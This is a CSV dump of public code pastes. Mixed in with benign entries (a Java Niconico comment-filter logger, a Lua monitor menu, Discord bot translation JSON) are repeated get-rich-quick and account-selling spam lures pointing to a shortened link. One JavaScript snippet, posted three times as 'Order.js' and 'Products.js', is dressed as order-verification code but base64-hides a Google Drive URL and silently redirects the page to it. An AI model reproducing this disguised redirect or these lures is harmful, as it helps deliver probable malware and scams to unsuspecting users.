id,title,username,language,date,content
RM7Yv95a,Make $1000 15-MINUTES (BEGINNER) WM,izayarais1,JavaScript,Sunday 30th of March 2025 12:54:30 AM CDT," 
Pdf https://tinyurl.com/methodssss


fanXor9CGM
"
eLMRMNQE,CommentFilterLogger.java,filledwithgarbages,Java,Sunday 30th of March 2025 12:52:00 AM CDT,"package extensions;

import dareka.NLMain;
import dareka.common.Logger;
import dareka.extensions.Extension2;
import dareka.extensions.ExtensionManager;
import dareka.processor.HttpHeader;
import dareka.processor.HttpRequestHeader;
import dareka.processor.Resource;
import dareka.processor.StringResource;
import dareka.processor.Processor;
import dareka.common.json.Json;
import dareka.common.json.JsonArray;
import dareka.common.json.JsonObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.regex.Pattern;
import java.util.regex.Matcher;
import javax.swing.JTextArea;
import javax.swing.JScrollPane;

public class CommentFilterLogger implements Extension2, Processor {
    
    public static final int REVISION = 250330;
    public static final String VER_STRING = ""CommentFilterLogger_"" + REVISION;
    
    private static final String[] PROCESSOR_SUPPORTED_METHODS = { ""POST"" };
    private static final Pattern PROCESSOR_SUPPORTED_PATTERN = Pattern.compile(
            ""^https?://www\\.nicovideo\\.jp/cache/filter_logs"");
    
    private static JTextArea logArea;
    
    private static final int BUFFER_SIZE = 8192;
    private static final int MAX_LOG_LENGTH = 100000;
    
    private static final int MAX_FILTER_VALUE_LENGTH = 50;  // フィルター表現の最大長

    // Extension2 interface
    public void registerExtensions(ExtensionManager mgr) {
        mgr.registerProcessor(this);
        
        if (logArea == null && NLMain.isLaunchGUI()) {
            logArea = new JTextArea();
            logArea.setEditable(false);
            logArea.setLineWrap(true);
            logArea.setWrapStyleWord(true);
            logArea.setFont(new java.awt.Font(""MS Gothic"", java.awt.Font.PLAIN, 12));
            JScrollPane scrollPane = new JScrollPane(logArea);
            NLMain.addTab(""CommentFilter"", null, scrollPane, ""フィルターログ"");
        }
    }
    
    public String getVersionString() {
        return VER_STRING;
    }
    
    // Processor Interface
    public String[] getSupportedMethods() {
        return PROCESSOR_SUPPORTED_METHODS;
    }
    
    public Pattern getSupportedURLAsPattern() {
        return PROCESSOR_SUPPORTED_PATTERN;
    }
    
    public String getSupportedURLAsString() {
        return null;
    }
    
    public Resource onRequest(HttpRequestHeader requestHeader, Socket browser) 
            throws IOException {
        InputStream in = browser.getInputStream();
        BufferedReader reader = new BufferedReader(
            new InputStreamReader(in, ""UTF-8""),
            BUFFER_SIZE
        );
        
        long contentLength = requestHeader.getContentLength();
        if (contentLength <= 0 || contentLength > BUFFER_SIZE) {
            return StringResource.getNotFound();
        }
        
        char[] buffer = new char[(int)contentLength];
        int bytesRead = reader.read(buffer, 0, (int)contentLength);
        
        if (bytesRead > 0) {
            final String rawMessage = new String(buffer, 0, bytesRead);
            
            try {
                // JSONArrayとして解析
                JsonArray logsArray = Json.parse(rawMessage).getArray();
                
                // 各ログエントリーを処理
                for (int i = 0; i < logsArray.size(); i++) {
                    JsonObject log = logsArray.get(i).getObject();
                    
                    String title = log.getString(""title"", ""不明"");
                    String userId = log.getString(""userId"", ""不明"");
                    String comment = log.getString(""comment"", ""不明"");
                    String videoId = log.getString(""videoId"", ""不明"");
                    
                    // フィルター詳細の処理
                    JsonArray filterDetails = log.get(""filterDetails"").getArray();
                    StringBuilder filterInfo = new StringBuilder();
                    
                    if (filterDetails != null) {
                        for (int j = 0; j < filterDetails.size(); j++) {
                            JsonObject detail = filterDetails.get(j).getObject();
                            String type = detail.getString(""type"", ""不明"");
                            String value = detail.getString(""value"", """");
                            
                            if (value.length() > MAX_FILTER_VALUE_LENGTH) {
                                value = value.substring(0, MAX_FILTER_VALUE_LENGTH) + ""..."";
                            }
                            
                            if (j > 0) filterInfo.append("", "");
                            filterInfo.append(type);
                            if (!value.isEmpty()) {
                                filterInfo.append(""("").append(value).append("")"");
                            }
                        }
                    }
                    
                    final String formattedMessage = String.format(
                        ""[%s]\n"" +
                        ""動画: %s\n"" +
                        ""動画ID: %s\n"" +
                        ""ユーザー: %s\n"" +
                        ""コメント: %s\n"" +
                        ""フィルター: %s\n"" +
                        ""----------------------------------------\n"",
                        new SimpleDateFormat(""yyyy/MM/dd HH:mm:ss"").format(new Date()),
                        title,
                        videoId,
                        userId,
                        comment,
                        filterInfo.toString()
                    );
                    
                    if (logArea != null) {
                        javax.swing.SwingUtilities.invokeLater(() -> {
                            if (logArea.getText().length() > MAX_LOG_LENGTH) {
                                logArea.setText(logArea.getText()
                                    .substring(logArea.getText().length() - MAX_LOG_LENGTH/2));
                            }
                            logArea.append(formattedMessage);
                            logArea.setCaretPosition(logArea.getDocument().getLength());
                        });
                    }
                }
                
                return new StringResource(""ok"");
            } catch (Exception e) {
                System.err.println(""フィルターログ処理エラー: "" + e.getMessage());
                e.printStackTrace();
                return StringResource.getNotFound();
            }
        }
        
        return StringResource.getNotFound();
    }
} "
VCbPjFvL,Order.js,rodrigomaise99,JavaScript,Sunday 30th of March 2025 12:42:37 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/180/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1z2Ss1TD,Binance account CW,izayarais1,JavaScript,Sunday 30th of March 2025 12:38:33 AM CDT," 
Pdf https://tinyurl.com/methodssss


2BT1vlNkGh
"
3uWM4UY5,startup,carubi,Lua,Sunday 30th of March 2025 12:36:45 AM CDT,"local monitor = peripheral.wrap(""left"")
if not monitor then
  print(""Kein Monitor gefunden! Bitte überprüfe die Verkabelung."")
  return
end
 
-- Funktion zum Zeichnen des Menüs
local function drawMenu()
  monitor.clear()
  monitor.setCursorPos(1,1)
  monitor.write(""== Touchscreen Menü =="")
  monitor.setCursorPos(1,3)
  monitor.write(""1. Option 1"")
  monitor.setCursorPos(1,4)
  monitor.write(""2. Option 2"")
  monitor.setCursorPos(1,5)
  monitor.write(""3. Beenden"")
end
 
drawMenu()
 
local running = true
while running do
  -- Warten auf eine Berührung auf dem Monitor
  local event, side, x, y = os.pullEvent(""monitor_touch"")
 
  -- Prüfen, ob die Berührung in einer der Menüzeilen erfolgte:
  if y == 3 then
    monitor.clear()
    monitor.setCursorPos(1,1)
    monitor.write(""Option 1 gewählt!"")
    sleep(2)
    drawMenu()
  elseif y == 4 then
    monitor.clear()
    monitor.setCursorPos(1,1)
    monitor.write(""Option 2 gewählt!"")
    sleep(2)
    drawMenu()
  elseif y == 5 then
    running = false
  end
end
 
monitor.clear()
monitor.setCursorPos(1,1)
monitor.write(""Programm beendet."")"
aCT8mPnN,EARN $900 INSTANTLY 2025 BT,izayarais1,JavaScript,Sunday 30th of March 2025 12:22:33 AM CDT," 
Pdf https://tinyurl.com/methodssss


qYX8I6rmUE
"
6jpXt19w,Untitled,rodrigomaise99,JavaScript,Sunday 30th of March 2025 12:11:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/844/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zP9CSniH,Random Gmail Acc 1A,izayarais1,JavaScript,Sunday 30th of March 2025 12:06:38 AM CDT," 
Pdf https://tinyurl.com/methodssss


zCTU1wUAgX
"
8paYPhuu,Products.js,rodrigomaise99,JavaScript,Saturday 29th of March 2025 11:56:29 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/347/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BniGFDHK,translation.json,NiiorBayzi,JSON,Saturday 29th of March 2025 11:35:09 PM CDT,"{
  ""errors"": {},
  ""texts"": {
    ""@"": {
      ""br"": ""**[ $randomText[🌟;⭐;✨] ] ›** Olá, eu sou o **$username[$botID]** e estou aqui para sua diversão e com várias funcionalidades. Meu prefixo é **`l.`**, para ver meus comandos utilize **`l.ajuda`**."",
      ""en"": ""**[ $randomText[🌟;⭐;✨] ] ›** Hii, I'm **$username[$botID]** and I'm here for your fun and with a lot of functions. My prefix is **`l.`**, to see my commands use **`l.help`**.""
    },
    ""botinfo"": {
      ""br"": {
        ""description"": ""> Olá de novo internauta, gostaria de agradecê-lo por fazer parte do $username[$botID], e incentivando-me a continuar. Eu ainda não tenho servidor oficial, mas caso você queira dar uma sugestão ou relatar algum problema, use o menu abaixo. 💙✨\n\n** › Comandos:** $commandsCount\n** › Servidores:** $serverCount\n** › Membros:** $allMembersCount"",
        ""footer"":""Criado com 💙 por"",
        ""button"":{
          ""suggest"":{
            ""label"":""Sugestão"",
            ""desc"":""Que tal me ajudar a ser cada vez melhor?""
          },
          ""report"":{
            ""label"":""Reportar"",
            ""desc"":""Reporte um erro ou um usuário.""
          },
          ""beta"":{
            ""label"":""Requisição ( Beta Tester )"",
            ""desc"":""Você pode testar os comandos antes que todo mundo.""
          },
          ""add"":{
            ""desc"":""Me adicione no seu servidor.""
          }
        }
      },
      ""en"":{
        ""description"":""> Hello again internet user, I would like to thank you for being part of the $username[$botID], and encouraging me to continue. I don't have an official server yet, but if you want to give a suggestion or report any problem, use the menu below. 💙✨ \n\n** › Commands:** $commandsCount\n** › Servers:** $serverCount\n** › Members:** $allMembersCount"",
        ""footer"":""Created with 💙 by"",
        ""button"":{
          ""suggest"":{
            ""label"":""Suggestion"",
            ""desc"":""How about helping me to be better and better?""
          },
          ""report"":{
            ""label"":""Report"",
            ""desc"":""Report a bug or a user.""
          },
          ""beta"":{
            ""label"":""Request ( Beta Test )"",
            ""desc"":""You can test the commands before everyone else.""
          },
          ""add"":{
            ""desc"":""Add me to your server.""
          }
        }
      }
    }
  }
}"
